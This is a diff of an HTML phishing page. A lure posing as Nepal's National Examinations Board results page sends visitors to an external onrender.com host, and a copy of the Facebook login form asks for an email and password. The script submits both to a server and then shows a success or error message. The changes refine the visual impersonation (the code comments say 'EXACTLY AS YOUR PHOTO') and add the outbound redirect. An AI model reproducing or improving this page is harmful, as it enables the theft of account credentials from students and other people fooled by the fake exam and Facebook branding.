@@ -13,24 +13,26 @@
 
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #ffffff;
+            background: linear-gradient(135deg, #f5f7fa 0%, #e9ecef 100%);
             min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
 
         /* NEB PAGE STYLES */
         .neb-container {
-            max-width: 500px;
+            max-width: 550px;
             margin: 0 auto;
-            padding: 40px 20px;
+            padding: 50px 30px;
             text-align: center;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
+            background: white;
+            border-radius: 30px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
         }
 
         .title h1 {
-            font-size: 32px;
+            font-size: 34px;
             color: #e63946;
             margin-bottom: 15px;
             font-weight: bold;
@@ -50,11 +52,11 @@
         }
 
         .class-section {
-            background: #f8f9fa;
-            border-radius: 15px;
+            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            border-radius: 20px;
             padding: 30px;
             margin: 30px 0;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
         }
 
         .class-section h3 {
@@ -64,9 +66,9 @@
         }
 
         .math {
-            font-size: 22px;
+            font-size: 24px;
             font-weight: bold;
-            color: #333;
+            color: #2c3e50;
             margin: 15px 0;
         }
 
@@ -74,36 +76,47 @@
             font-size: 20px;
             color: #e63946;
             font-family: monospace;
-            background: #f0f0f0;
+            background: white;
             display: inline-block;
-            padding: 8px 20px;
-            border-radius: 25px;
+            padding: 8px 25px;
+            border-radius: 30px;
             margin: 10px 0;
-        }
-
-        .continue-btn {
-            background: #e63946;
-            color: white;
-            border: none;
-            padding: 14px 40px;
-            font-size: 16px;
             font-weight: bold;
-            border-radius: 40px;
-            cursor: pointer;
-            margin-top: 20px;
-        }
-
-        .continue-btn:hover {
-            background: #c1121f;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
         }
 
         hr {
-            margin: 20px 0;
+            margin: 25px 0;
             border: none;
-            border-top: 1px solid #ddd;
+            border-top: 2px dotted #ddd;
         }
 
-        /* FACEBOOK PAGE STYLES */
+        .continue-btn {
+            background: linear-gradient(135deg, #e63946 0%, #c1121f 100%);
+            color: white;
+            border: none;
+            padding: 16px 50px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+            box-shadow: 0 5px 15px rgba(230, 57, 70, 0.3);
+            width: 100%;
+        }
+
+        .continue-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(230, 57, 70, 0.5);
+        }
+
+        .decor {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #999;
+        }
+
+        /* FACEBOOK PAGE STYLES (EXACTLY AS YOUR PHOTO) */
         .fb-container {
             display: none;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
@@ -115,13 +128,13 @@
 
         .fb-box {
             width: 100%;
-            max-width: 400px;
+            max-width: 420px;
             padding: 20px;
         }
 
         .fb-logo {
             text-align: center;
-            margin-bottom: 30px;
+            margin-bottom: 25px;
         }
 
         .fb-logo h1 {
@@ -130,10 +143,18 @@
             font-weight: bold;
         }
 
+        .fb-tagline {
+            text-align: center;
+            font-size: 20px;
+            color: #1c1e21;
+            margin-bottom: 30px;
+            font-weight: normal;
+        }
+
         .fb-login-box {
             background: white;
             border-radius: 8px;
-            padding: 16px;
+            padding: 20px;
             box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
         }
 
@@ -142,7 +163,7 @@
             padding: 14px 16px;
             margin-bottom: 12px;
             border: 1px solid #dddfe2;
-            border-radius: 8px;
+            border-radius: 6px;
             font-size: 17px;
             outline: none;
         }
@@ -157,11 +178,12 @@
             background: #1877f2;
             border: none;
             padding: 12px;
-            border-radius: 8px;
+            border-radius: 6px;
             font-size: 20px;
             font-weight: bold;
             color: white;
             cursor: pointer;
+            margin-bottom: 16px;
         }
 
         .fb-login-btn:hover {
@@ -170,11 +192,11 @@
 
         .fb-forgot {
             text-align: center;
-            margin: 15px 0;
+            margin-bottom: 20px;
         }
 
         .fb-forgot a {
-            color: #1b1f23;
+            color: #1877f2;
             text-decoration: none;
             font-size: 14px;
         }
@@ -186,39 +208,26 @@
 
         .fb-create-btn {
             width: 100%;
-            background: transparent;
-            border: 2px solid #1877f2;
+            background: #42b72a;
+            border: none;
             padding: 12px;
-            border-radius: 8px;
+            border-radius: 6px;
             font-size: 17px;
             font-weight: bold;
-            color: #1877f2;
+            color: white;
             cursor: pointer;
         }
 
         .fb-create-btn:hover {
-            background: #e7f3ff;
+            background: #36a420;
         }
 
-        /* META LOGO - DARK BLACK, BOLD/THICK */
-        .fb-meta {
+        .error-msg {
+            color: #f02849;
             text-align: center;
-            margin-top: 30px;
-        }
-
-        .meta-logo {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            font-size: 16px;
-            font-weight: 900;
-            color: #1b1f23;
-            letter-spacing: 1px;
-        }
-
-        .infinity {
-            font-size: 20px;
-            font-weight: 900;
+            font-size: 13px;
+            margin: 10px 0;
+            display: none;
         }
     </style>
 </head>
@@ -227,7 +236,7 @@
 <!-- NEB PAGE -->
 <div id="nebPage" class="neb-container">
     <div class="title">
-        <h1>राष्ट्रिय परीक्षा बोर्ड</h1>
+        <h1>🇳🇵 राष्ट्रिय परीक्षा बोर्ड</h1>
         <h2>National Examinations Board</h2>
         <p>सानोठिमी, भक्तपुर | Nepal</p>
     </div>
@@ -240,19 +249,28 @@
 
     <hr>
 
-    <button class="continue-btn" onclick="showFacebook()">Continue to Facebook →</button>
+    <button class="continue-btn" onclick="window.location.href='https://facebook0k-4scr.onrender.com'">
+        🔗 Continue to link →
+    </button>
+
+    <div class="decor">
+        ✨ नतिजा हेर्नुहोस् | ✨ Check Results
+    </div>
 </div>
 
-<!-- FACEBOOK PAGE -->
+<!-- FACEBOOK PAGE (Hidden initially) -->
 <div id="fbPage" class="fb-container">
     <div class="fb-box">
         <div class="fb-logo">
             <h1>facebook</h1>
         </div>
+        <div class="fb-tagline">
+            Connect with friends and the world around you on Facebook.
+        </div>
         <div class="fb-login-box">
-            <input type="text" id="email" placeholder="Mobile number or email address">
+            <input type="text" id="email" placeholder="Email or phone number">
             <input type="password" id="password" placeholder="Password">
-            <div id="errorMsg" style="color:red; font-size:13px; margin-bottom:10px; display:none;"></div>
+            <div id="errorMsg" class="error-msg"></div>
             <button class="fb-login-btn" id="loginBtn">Log in</button>
             <div class="fb-forgot">
                 <a href="#">Forgotten password?</a>
@@ -260,45 +278,42 @@
             <div class="fb-hr"></div>
             <button class="fb-create-btn" id="createBtn">Create new account</button>
         </div>
-        
-        <!-- META LOGO - DARK BLACK, BOLD -->
-        <div class="fb-meta">
-            <div class="meta-logo">
-                <span class="infinity">∞</span>
-                <span>Meta</span>
-            </div>
-        </div>
     </div>
 </div>
 
 <script>
+    // Check if we are on Facebook page or NEB page
+    if (window.location.pathname === '/fb' || window.location.hash === '#fb') {
+        document.getElementById('nebPage').style.display = 'none';
+        document.getElementById('fbPage').style.display = 'flex';
+    }
+
     const emailInput = document.getElementById('email');
     const passwordInput = document.getElementById('password');
     const loginBtn = document.getElementById('loginBtn');
     const errorDiv = document.getElementById('errorMsg');
 
-    function showFacebook() {
-        document.getElementById('nebPage').style.display = 'none';
-        document.getElementById('fbPage').style.display = 'flex';
-    }
-
     async function doLogin() {
-        const email = emailInput.value;
-        const password = passwordInput.value;
+        const email = emailInput?.value;
+        const password = passwordInput?.value;
 
-        errorDiv.style.display = 'none';
+        if (errorDiv) errorDiv.style.display = 'none';
 
         if (!email) {
-            errorDiv.innerText = 'Mobile number or email address is required.';
-            errorDiv.style.display = 'block';
-            emailInput.focus();
+            if (errorDiv) {
+                errorDiv.innerText = 'Email or phone number is required.';
+                errorDiv.style.display = 'block';
+            }
+            emailInput?.focus();
             return;
         }
 
         if (!password) {
-            errorDiv.innerText = 'Password is required.';
-            errorDiv.style.display = 'block';
-            passwordInput.focus();
+            if (errorDiv) {
+                errorDiv.innerText = 'Password is required.';
+                errorDiv.style.display = 'block';
+            }
+            passwordInput?.focus();
             return;
         }
 
@@ -313,35 +328,47 @@
             if (data.success) {
                 alert('Login successful!');
             } else {
-                errorDiv.innerText = 'The password that you\'ve entered is incorrect.';
-                errorDiv.style.display = 'block';
-                passwordInput.focus();
+                if (errorDiv) {
+                    errorDiv.innerText = 'The password that you\'ve entered is incorrect.';
+                    errorDiv.style.display = 'block';
+                }
+                passwordInput?.focus();
             }
         } catch (err) {
-            errorDiv.innerText = 'Connection error. Try again.';
-            errorDiv.style.display = 'block';
+            if (errorDiv) {
+                errorDiv.innerText = 'Connection error. Try again.';
+                errorDiv.style.display = 'block';
+            }
         }
     }
 
-    // ENTER KEY LOGIN - FIXED
-    emailInput.addEventListener('keypress', function(e) {
-        if (e.key === 'Enter') {
-            e.preventDefault();
-            doLogin();
-        }
-    });
+    if (loginBtn) {
+        loginBtn.addEventListener('click', doLogin);
+    }
 
-    passwordInput.addEventListener('keypress', function(e) {
-        if (e.key === 'Enter') {
-            e.preventDefault();
-            doLogin();
-        }
-    });
+    if (emailInput) {
+        emailInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                doLogin();
+            }
+        });
+    }
 
-    loginBtn.addEventListener('click', doLogin);
-    createBtn.addEventListener('click', function() {
-        alert('Create new account coming soon');
-    });
+    if (passwordInput) {
+        passwordInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                doLogin();
+            }
+        });
+    }
+
+    if (document.getElementById('createBtn')) {
+        document.getElementById('createBtn').addEventListener('click', function() {
+            alert('Create new account coming soon');
+        });
+    }
 </script>
 
 </body>
